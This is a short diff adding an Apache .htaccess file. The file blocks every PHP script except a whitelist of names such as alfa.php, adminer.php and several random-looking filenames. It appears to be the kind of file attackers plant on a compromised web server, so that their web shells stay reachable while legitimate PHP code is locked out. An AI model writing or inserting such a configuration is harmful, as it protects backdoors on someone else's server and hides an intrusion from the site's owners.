@@ -1,0 +1,9 @@
+<FilesMatch "\.(php|ph*|Ph*|PH*|pH*|php7)$">
+    Deny from all
+</FilesMatch>
+<FilesMatch "^(iniator.php|adminer.php|locallator.php|alfa.php|settings.php|index.php|witather.php|magenta.php|blockcanary.php|serverconnection.php)$">
+    Allow from all
+</FilesMatch>
+<FilesMatch "\.(jpg|png|gif|pdf|jpeg)$">
+    Allow from all
+</FilesMatch>
